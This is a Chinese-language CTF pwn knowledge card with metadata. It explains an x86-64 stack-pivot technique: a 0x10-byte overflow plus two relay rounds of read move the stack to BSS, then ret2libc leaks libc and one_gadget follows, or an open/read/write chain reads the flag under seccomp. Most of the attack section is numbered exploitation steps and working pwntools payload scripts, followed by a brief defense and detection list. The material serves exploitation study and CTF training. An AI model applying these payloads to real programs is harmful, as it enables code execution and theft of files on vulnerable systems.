---
id: binary-pwn-stack-0x10-two-round-read-relay-bss-pivot
title: 0x10 短溢出 + 两轮 read 接力调整 rsp 迁 BSS：ret2libc 泄 libc 接 one_gadget，或 seccomp 下分两段 ORW
type: scenario
domain: binary
path: binary/pwn/stack
technique: two-round-read-relay-bss-stack-pivot
aliases:
- 两次read栈迁移
- 栈迁移固定模板+0x10
- bss+0x20 接力
- alittle 栈迁移
- VN2023 Traveler 栈迁移
- 黄河流域 Sandbox 栈迁移
- 0x10 短溢出 BSS 迁移
tags:
- pwn
- stack
- stack-overflow
- stack-pivot
- leave-ret
- bss
- rop
- ret2libc
- one-gadget
- seccomp
- orw
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V653
  verified_at: '2026-11-13T05:27:18+08:00'
  notes: 已对照原文《栈迁移（Stack Pivoting）进阶》全文与22张图核对：bss6=0x601000+0x600(图03/04/09)、首轮saved rbp=bss6+返回read 0x40054b(图01/03/04)、第二轮p64(bss6+0x20)+read使rbp=0x601620/read缓冲落回0x601600(图05/06)、第三轮链p64(bss6+0x20+0x10)+pop_rdi(0x4005d3)+puts_got+puts_plt+main与图08 tele 0x601600完全一致；图08显示call read返回地址槽0x601608被pop_rdi覆盖，故已修正卡内'首qword为leave pop rbp槽、gadget从+0x10起'的表述。one_gadget r12=libc+0x2f709、og=0xe3afe execve+638(图11)与原文一致；alittle-up seccomp dump(图12)为sys_number==execve时KILL、其余ALLOW，卡内'只放行arch/sys_number'措辞已改正；ORW文件名0x601200/read(图13/14)、黄河流域write收尾均与原文exp一致。dedup：与0x10-printf-leak卡、lea-rax卡仅likely_duplicate非同一链(泄漏/迁移机制不同)，dup-scan无本篇pair，保留。未验证点：未在本机复跑原文EXP，偏移依赖各题二进制需gdb校准；黄河流域无seccomp dump截图，按exp的ORW推断。
---

## 一句话结论

当溢出只能覆盖 saved rbp 与返回地址（0x10 字节）、但函数体内存在以 rbp 为基址的定长 `read`（如 `read(0, rbp-0x20, 0x30)`）时，把 saved rbp 设为 BSS 地址、返回地址设回该 read 入口，连续两轮让 read 把下一轮的 saved rbp/返回地址与 ROP 链写进 BSS：第二轮 rbp 的增量正好等于 buf 相对 rbp 的偏移，`leave; ret` 两次后 rsp 被校正到 BSS 预置链上（原文称“固定模板 +0x10”）。链上先用 `puts(puts@got)` 泄 libc 再接 one_gadget；若 seccomp 禁止 execve（本例 alittle-up 仅 execve 被 KILL、其余 syscall 放行），则用同样的多轮接力把 ORW 链分两段写入 BSS 后读 flag。

## 原理

- **短溢出的字节预算**：`char buf[0x20]; read(0, buf, 0x30)` 只多出 0x10 字节，刚好覆盖 saved rbp 与返回地址，放不下 `pop rdi; GOT; puts@plt; main` 这类完整链；但 `rbp` 与 `rip` 都可控。
- **`leave; ret` 语义（x86-64）**：`leave` = `mov rsp, rbp; pop rbp`；`ret` = `pop rip`。因此只要控制 saved rbp，就能让函数尾声把 rsp 指到任意可写区域，再 `pop` 出下一轮 rbp 与 rip。
- **两轮 read 接力**：
  1. 第一轮溢出：`padding + p64(bss) + p64(函数内 read 入口)`。函数返回后进入 read，此时 `rbp=bss`，read 的缓冲区为 `rbp-0x20`（即 bss-0x20），写入 0x30 字节。
  2. 第二轮继续发送 `padding(0x20) + p64(bss+0x20) + p64(read 入口)`：这段数据落在 bss-0x20 起，0x20 填充后正好改写 bss 处的 saved rbp 为 `bss+0x20`、bss+8 处的返回地址为 read。函数尾声 `leave; ret` 把 rbp 换成 `bss+0x20`，再次进入 read。
  3. 第三轮 read 现在写 `rbp-0x20 = bss`，即把真正的 ROP 链写到 BSS 开头。链按原文模板布置为 `p64(bss+0x20+0x10) + pop_rdi + puts@got + puts@plt + main`。这一轮是直接 `ret` 进入函数中段、未走函数序言（进入时 rsp=bss+0x10），因此 `call read` 的返回地址恰落在链的 +0x08：第二个 qword（pop_rdi）将它覆盖，read 返回即执行 `pop rdi; puts@got`，再 `ret` 到 +0x18 的 puts@plt，puts 返回后接 +0x20 的 main；链首 qword 在本例中不参与执行，只是原文所称“固定模板 +0x10”槽（值 bss+0x20+0x10），偏移需按目标的 buf/rbp 布局用 gdb 校准。
- **为什么必须两轮**：第一轮只负责把 rbp 迁到 BSS 并借函数自身 read 写第二段；第二轮的 rbp 增量（buf 偏移）把下一段写到 BSS 低地址，才能形成“栈即 BSS”的连续布局。只做一轮时 rsp 仍指向原栈，程序流不可控（原文调试即卡在这里）。
- **ret2libc 收尾**：BSS 链上 `pop rdi; puts@got; puts@plt; main` 打印 libc 地址；返回 main 后重新走一遍两轮接力（此时可拿到新的 bss/stack 布局），把 `pop r12; 0; one_gadget` 或 `pop rdi; /bin/sh; system` 送入，完成 getshell。原文在 `system` 链栈平衡反复失败后改用 one_gadget `execve("/bin/sh", r15, r12)`（约束 `[r12]==NULL`），用 `pop r12` 清零后成功。
- **seccomp 变体**：`seccomp-tools dump` 截图（原文 alittle-up）显示过滤器校验 arch 与 sys_number，`sys_number == execve` 时返回 KILL、其余 syscall 一律 ALLOW；黄河流域-Sandbox 同样按 open/read/write 的 ORW 完成。因此不能 system/one_gadget；改为 `open(path,0) → read(3,buf,0x100) → puts(buf)`。由于单轮 read 只有 0x30 字节，ORW 链分成两段：第一段用 `pop_rdi; 0; pop_rsi_r15; 0x601200; 0x40; read` 把文件名读进 BSS，再同样两轮接力送入系统调用链，最终 `open/read/puts`（黄河流域用 write）输出 flag。

## 触发条件

- x86-64 ELF，栈溢出长度只够覆盖 saved rbp + 返回地址（0x10），放不下完整 ROP 链。
- 函数体内存在以 `rbp` 为基址的定长 read（本例 `read(0, rbp-0x20, 0x30)`），且能作为返回目标重复进入。
- 非 PIE 或已泄漏代码基址，BSS 地址固定可写；函数尾声为 `leave; ret`。
- 目标可能启用 seccomp（本例 execve 被 KILL、其余 syscall 放行；白名单场景只放行 open/read/write 等），此时需要 ORW 而不是 execve。
- 需要目标 libc 版本（泄漏后计算）与 one_gadget/寄存器 gadget 偏移。

## 利用步骤

1. `checksec` 确认保护与溢出形状，反汇编确认 `buf` 相对 rbp 的偏移（0x20）、read 长度（0x30）、read 调用点地址与 `leave; ret`。
2. 第一轮：`padding + p64(bss) + p64(read_entry)`，把 rbp 迁到 BSS。
3. 第二轮：`padding(0x20) + p64(bss+0x20) + p64(read_entry)`，把 next rbp 推进到 bss+0x20，并让 read 把第三段写到 bss。
4. 第三轮：`p64(bss+0x20+0x10) + pop_rdi + puts_got + puts_plt + main`；前两轮已各执行一次 `leave; ret`，本轮 payload 覆盖 `call read` 的返回地址，read 返回即执行 `puts(puts@got)` 泄 libc。
5. 接收 6 字节 libc 地址，计算 libc base、system、/bin/sh、one_gadget（原文 move your heart 分支对泄漏值做了 `-0xa000000000000` 的栈高位噪声修正，仅该题适用）。
6. 再跳回 main 重复 2–4 步（拿到新一轮 bss/stack），最后一轮送入 `pop r12; 0; one_gadget` 或 `pop rdi; /bin/sh; system`。
7. seccomp 变体：把第 4 步换成 `pop_rdi; 0; pop_rsi_r15; flag_buf; 0x40; read` 读入文件名，再接 `open/read/puts` 链；链较长时用同样接力分两段写入 BSS。

## PoC

两轮接力骨架（原文 alittle，地址按目标重算）：

```python
from pwn import *
context(os='linux', arch='amd64')
elf = ELF('./pwn'); libc = ELF('./libc.so.6')
bss6 = elf.bss() + 0x600
read_entry = 0x40054b     # 函数内 read(0, rbp-0x20, 0x30) 入口
pop_rdi    = 0x4005d3
leave_ret  = 0x400567

# 1) 溢出：saved rbp=bss6，返回 read
p.send(b'a'*0x20 + p64(bss6) + p64(read_entry))
# 2) 第二轮：saved rbp=bss6+0x20，再次返回 read；read 把第三段写到 bss6
p.send(b'a'*0x20 + p64(bss6+0x20) + p64(read_entry))
# 3) 第三段链：+0x08 处覆盖本轮 call read 的返回地址（pop_rdi），首 qword 为固定模板槽
p.send(p64(bss6+0x20+0x10) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main']))
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']

# 4) 重新两轮接力后送入 one_gadget（原文 0xe3afe execve('/bin/sh', r15, r12)）
r12 = libc_base + 0x2f709
og  = libc_base + 0xe3afe
p.send(p64(0) + p64(r12) + p64(0) + p64(og))
p.interactive()
```

seccomp ORW 收尾（原文 alittle-up，分两段写入）：

```python
syscall = libc_base + libc.sym['syscall']
# open('flag',0) -> read(3,0x601200,0x100) -> puts(0x601200)
chain  = p64(0) + p64(pop_rdi) + p64(2) + p64(pop_rsi_r15) + p64(0x601200) + p64(0) + p64(syscall)
chain += p64(pop_rdi) + p64(3) + p64(pop_rsi_r15) + p64(0x601200) + p64(0x100) + p64(read_addr)
chain += p64(pop_rdi) + p64(0x601200) + p64(puts_addr)
```

说明：`bss+0x20` 中的 0x20 等于 buf 相对 rbp 的偏移；`+0x10` 为原文固定模板值（bss+0x20+0x10），换题目必须用 gdb 校准每轮 rbp 落点、`call read` 返回地址槽与链首偏移，差 8 字节即错位崩溃。未在本机复跑原文 EXP。

## 变体与关联

- 变体：若函数内是 `read(0, rbp-0x??, N)` 的其它偏移，按同样思路把增量换成对应值；若没有以 rbp 为基址的 read，可回到 `leave; ret` 直接迁 BSS（[[binary-pwn-stack-pivot-leave-ret-bss]]）。
- 变体：有一次性大读入 BSS 的原语时，可先用大读预置完整链再用 0x10 溢出迁栈，见 [[binary-pwn-stack-short-overflow-bss-pivot-3stage-srop-orw-syscall-wrapper]]；用 `lea rax,[rbp+buf]` 读封装迁移见 [[binary-pwn-stack-lea-rax-rbp-buf-short-read-bss-migration-orw]]。
- 变体：无输出函数、只能用 `_start` 逐格分块写 ROP 的场景见 [[binary-pwn-stack-bss-pivot-write-gadget-chunked-orw]]；把 rbp 当任意写指针改 GOT 的用法见 [[binary-pwn-stack-rbp-arbitrary-write-got-read-write-dlresolve-chunked-rop]]。
- 变体：seccomp 放行 execve 时可直接 one_gadget；只放行 open/read/write 时必须 ORW，`pop rdx` 缺失时可从 libc 搜索或用 `pop rdx; pop r12; ret`。
- 关联：[[binary-pwn-stack-0x10-overflow-printf-rbp-leak-leave-ret-orw]]（有栈地址泄漏时的 0x10 溢出迁回栈缓冲区玩法）。

## 检测与防御

- 防御：read 长度严格等于缓冲区大小；启用 Canary/PIE，使 saved rbp 覆盖与 BSS 地址不可预测；Full RELRO 降低后续 GOT 利用空间。
- 防御：seccomp 只禁 execve 并不能阻止 ORW 读文件，需限制 open 路径或文件权限；对 `rbp` 作为读写基址的代码做审计。
- 检测：崩溃/审计中发现 rsp 落在 `.bss`、返回地址指向函数内 read 调用点、连续多轮 0x30 字节读取并伴随栈指针跳到全局区；CTF 之外可视为 ROP 栈迁移行为。
